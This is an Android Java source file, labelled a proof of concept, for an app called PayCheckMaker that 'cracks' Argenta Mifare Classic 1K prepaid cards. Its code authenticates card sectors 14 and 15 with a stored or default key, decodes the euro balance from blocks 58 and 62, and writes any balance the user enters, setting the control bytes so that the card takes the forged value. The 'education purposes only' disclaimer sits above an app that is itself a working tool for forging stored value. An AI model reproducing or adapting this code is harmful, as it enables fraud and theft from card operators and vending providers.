//PayCheckMaker - PoC [Argenta Mifare 1K Crack]
//Developed by Gabriele Di Lieto, Lecco, Italy
//Version 1.0.0 - Stable
//Licensed under GPL v3
//No Warranty - Education purposes only
//I'm not responsible for illegal uses of my programs

package it.TheJoker.PayCheckMaker;

import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.tech.MifareClassic;
import android.nfc.tech.NfcA;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.IOException;
import java.math.BigInteger;

import androidx.appcompat.app.AppCompatActivity;

import static android.nfc.tech.MifareClassic.KEY_DEFAULT;
import static java.lang.Thread.sleep;


public class MainActivity extends AppCompatActivity {
    //Global variables declaration
    TextView label;
    TextView balance;
    EditText money;
    IntentFilter[] filters;
    String[][] techs;
    PendingIntent pendingIntent;
    NfcAdapter adapter;
    MifareClassic card = null;
    boolean flag = true;
    isConnectedThread conThread = null;

    //declaration of card's keys
    byte[] KEY_A ;
    /*
        byte[] KEY_B = new byte[] { (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF };
        KEY_B is not used, example of declaration of a key (in this case if key = FFFFFFFFFFFF, default one)
    */


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        label = findViewById(R.id.testo);
        balance = findViewById(R.id.balance);
        money  = findViewById(R.id.editText);
        adapter = NfcAdapter.getDefaultAdapter(this);

        //Check if device is compatible for NFC support, if it is not an alert dialog is shown
        if(adapter == null)
        {
            new AlertDialog.Builder(MainActivity.this)
                    .setTitle(getString(R.string.text_warning_nfc_not_present))
                    .setMessage(getString(R.string.text_device_not_compatible))
                    .setCancelable(false)
                    .setPositiveButton(getString(R.string.text_close_app),
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    finish();
                                }
                            }).create().show();
        }

        //if the app is opened by a card then it runs onNewIntent() function
        Intent intentStart = this.getIntent();
        if(intentStart.getAction().equals("android.nfc.action.TECH_DISCOVERED"))
        {
            onNewIntent(intentStart);
        }

        //if a tag is found then it runs onNewIntent() function (when app is already opened)
        pendingIntent = PendingIntent.getActivity(this, 0, new Intent(this, getClass()).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0);
        IntentFilter mifare = new IntentFilter((NfcAdapter.ACTION_TECH_DISCOVERED));
        filters = new IntentFilter[] { mifare };
        techs = new String[][] { new String[] {  NfcA.class.getName() } };

        //binds a function on the button click
        final Button button = findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                //deactivation of thread check (see below, function onNewIntent())
                flagCheck('f');
                if(card == null)
                {
                    //if no tag is found shows an error and reactivates thread check
                    toastMsg("No Tag Found");
                    flagCheck('t');
                }
                else if(money.getText().toString().equals(""))
                {
                    //if no amount is entered shows an error and reactivates thread check
                    toastMsg("Enter an amount");
                    flagCheck('t');
                }
                else
                {
                    //the comma gets removed and the value is casted into an int
                    int moneyValue = (int)((Double.parseDouble(money.getText().toString()))*100);
                    String moneyHex;

                    //the value is turned into a 4 character hexadecimal string
                    if(moneyValue <= 0)
                    {
                        moneyHex = "0000";
                    }
                    else if(moneyValue >= 65535)
                    {
                        moneyValue = 65535;
                        moneyHex = "FFFF";
                    }
                    else
                    {
                        moneyHex = Integer.toHexString(moneyValue);
                        if(moneyHex.length() == 1)
                        {
                            moneyHex = "000" + moneyHex;
                        }
                        else if(moneyHex.length() == 2)
                        {
                            moneyHex = "00" + moneyHex;
                        }
                        else if(moneyHex.length() == 3)
                        {
                            moneyHex = "0" + moneyHex;
                        }
                    }
                    //writes the value on the card and updates the balance
                    if(cardWrite(moneyHex))
                    {
                        toastMsg("Operation successfully completed!");
                        double moneyValueD = (double)moneyValue / 100;
                        balance.setText("Balance : "+Double.toString(moneyValueD)+"€");
                    }
                    else
                    {
                        toastMsg("Operation failed :(");
                    }
                    flagCheck('t');
                }
            }
        });

        //Prevents input of more than 2 decimal digits
        money.addTextChangedListener(new TextWatcher() {

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {}

            @Override
            public void afterTextChanged(Editable edt) {
                String temp = edt.toString();
                int posDot = temp.indexOf(".");
                if (posDot <= 0)
                {
                    return ;
                }
                if (temp.length() - posDot - 1 > 2)
                {
                    edt.delete(posDot + 3, posDot + 4);
                }
            }
        });
    }

    public void onPause() {
        super.onPause();
        if(adapter != null)
        {
            adapter.disableForegroundDispatch(this);
        }
    }
    //Make app listen for NFC tags, if one is found then the application is resumed
    public void onResume() {
        super.onResume();
        if(adapter != null)
        {
            adapter.enableForegroundDispatch(this, pendingIntent, filters, techs);
        }
        checkNfcEnabled();
    }

    //function runned when NFC tag is found
    public void onNewIntent(Intent intent) {
        //the tag is taken from the intent and saved in to a MifareClassic class object
        Tag tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG);
        card = MifareClassic.get(tag);
        //prints card's UID to screen
        toastMsg("Tag Found UID: " + bin2hex(tag.getId()));
        label.setText("Tag Connected");
        //reads balance and updates UI
        readBalance();
        //creates and starts thread that checks if the card is still in range
        conThread = new isConnectedThread();
        conThread.start();
    }

    //Authenticates a given sector
    public boolean authenticateCard(int sector) {
        if (!card.isConnected())
        {
            try
            {
                card.connect();
            }
            catch (IOException e1)
            {
                label.setText("Connection error");
                return false;
            }
        }
        try
        {
            authenticateA(sector);
        }
        catch (Exception e)
        {
            label.setText("Error key A");
            return false;
        }
        return true;
    }

    //Authenticates sector with KEY A
    private void authenticateA(int sector) throws Exception {

        if (card.authenticateSectorWithKeyA(sector, KEY_A))
        {
            return;
        }
        if (card.authenticateSectorWithKeyA(sector, KEY_DEFAULT))
        {
            return;
        }
        throw new Exception("Authentication error");
    }

    /*
    Authenticates sector with KEY B, not used in this case
    private void authenticateB(int sector) throws Exception {

        if (card.authenticateSectorWithKeyB(sector, KEY_B))
        {
            return;
        }
        if (card.authenticateSectorWithKeyB(sector, KEY_DEFAULT))
        {
            return;
        }
        throw new Exception("Authentication error");
    }
    */

    //Reads balance and updates UI
    private void readBalance() {
        try
        {
            //declaration of the bytes array that will contain cards blocks dumps
            byte[] block1 = new byte[16];
            byte[] block2 = new byte[16];
            double balanceValue;

            //Tries authentication of sector 14 , if is successful then reads the block
            if(authenticateCard(14))
            {
                block1 = card.readBlock(58);
            }
            //Tries authentication of sector 15 , if is successful then reads the block
            if(authenticateCard(15))
            {
                block2 = card.readBlock(62);
            }
            /*
              Checks if blocks aren't null , if they're not then it gets the current balance.
              To determine which block contains the current balance it checks the control character of each block.
              the control characters cycles between the values 10 (A in hex) , 11 (B in hex) and 12 (C in hex), the
              block that contains the right balance is the one whose control character is bigger .
              in the case of A and C , the right block is the one containing A because it comes after the C.
              Representation : A>B>C>A>..etc
             */
            if(block1 == null || block2 == null)
            {
                return;
            }
            else if(block1[8] == (byte) 0x0A && block2[8] == (byte) 0x0C)
            {
                balanceValue = Integer.parseInt(bin2hex(new byte[] {block1[1], block1[2]}), 16);
            }
            else if(block1[8] == (byte) 0x0C && block2[8] == (byte) 0x0A)
            {
                balanceValue = Integer.parseInt(bin2hex(new byte[] {block2[1], block2[2]}), 16);
            }
            else if(block1[8] > block2[8])
            {
                balanceValue = Integer.parseInt(bin2hex(new byte[] {block1[1], block1[2]}), 16);
            }
            else
            {
                balanceValue = Integer.parseInt(bin2hex(new byte[] {block2[1], block2[2]}), 16);
            }
            balanceValue /= 100;
            balance.setText("Balance : "+Double.toString(balanceValue)+"€");

        }
        catch(Exception e)
        {
            balance.setText("Error reading the balance");
        }
    }

    //function that writes two blocks of the card using two 16 bytes array
    private boolean cardWrite(String value) {
        //Splits the string (that containing the hexadecimal value of the amount entered by the user) into two integer
        int valueA = Integer.parseInt(value.substring(0, 2), 16);
        int valueB = Integer.parseInt(value.substring(2, 4), 16);
        try
        {
            //Checks if card is connected
            if (!card.isConnected())
            {
                try
                {
                    card.connect();
                }
                catch (IOException e1)
                {
                    label.setText("Connection error");
                    return false;
                }
            }
            //Tries authentication of sector 14, if is successful it writes the first 16 byte array
            if(authenticateCard(14))
            {
                card.writeBlock(58,new byte[] { (byte) 0x00, (byte) valueA, (byte) valueB, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0A, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 });
            }
            else
            {
                return false;
            }
            //Tries authentication of sector 15 (cancels previous authentication), if is successful it writes the second 16 byte array
            if(authenticateCard(15))
            {
                card.writeBlock(62,new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0C, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 });
            }
            else
            {
                return false;
            }
            card.close();
            return true;
        }
        catch(Exception e)
        {
            label.setText("Write error");
            return false;
        }
    }

    //function that creates custom toast
    public void toastMsg(String msg) {
        Toast toast = Toast.makeText(this, msg, Toast.LENGTH_LONG);
        toast.show();
    }

    //function that converts a byte array to an hexadecimal string (used in conversion of UID,balance)
    static String bin2hex(byte[] data) {
        return String.format("%0" + (data.length * 2) + "X", new BigInteger(1, data));
    }

    //function that checks if NFC is activated , otherwise it requests the activation
    private void checkNfcEnabled() {
        if(adapter != null)
        {
            boolean nfcEnabled;
            //try and catch for eventual Exceptions
            try {
                nfcEnabled = adapter.isEnabled();
            } catch (Exception e) {
                //double check because sometimes it isEnabled() fails at first try
                try {
                    nfcEnabled = adapter.isEnabled();
                } catch (Exception ex) {
                    nfcEnabled = false;
                }
            }
            if (!nfcEnabled) {
                AlertDialog.Builder dialog = new AlertDialog.Builder(MainActivity.this);
                dialog.setTitle(getString(R.string.text_warning_nfc_is_off));
                dialog.setMessage(getString(R.string.text_turn_on_nfc));
                dialog.setCancelable(false);
                dialog.setPositiveButton(getString(R.string.text_update_settings),
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                startActivity(new Intent(android.provider.Settings.ACTION_NFC_SETTINGS));
                                dialog.dismiss();
                            }
                        }).create().show();
            }
        }
    }

    //Thread that checks if NFC card is still in range of the scanner
    public class isConnectedThread extends Thread {
        @Override
        public void run() {
            if (isStillInRange())
            {
                runOnUiThread(new Runnable(){
                    @Override
                    public void run() {
                        label.setText("No tag found");
                        balance.setText("Balance : ");
                        toastMsg("Tag disconnected");
                    }
                });
                card = null;
            }
        }
    }

    //function that checks if tag is still in range. Raises IOException if is not
    public boolean isStillInRange(){
        while (true)
        {
            while (flagCheck('r'))
            {
                try
                {
                    if (card.isConnected())
                    {
                        card.close();
                    }
                    card.connect();
                    sleep(100);
                }
                catch (Exception e)
                {
                    return true;
                }
            }
        }
    }

    //function that allows to pause and resume the thread (synchronized to avoid accessing simultaneously to the same memory area)
    public synchronized boolean flagCheck(char ch){
        if(ch == 'r')
        {
            return flag;
        }
        else if(ch == 't')
        {
            flag = true;
            return true;
        }
        else
        {
            flag = false;
            return true;
        }
    }
}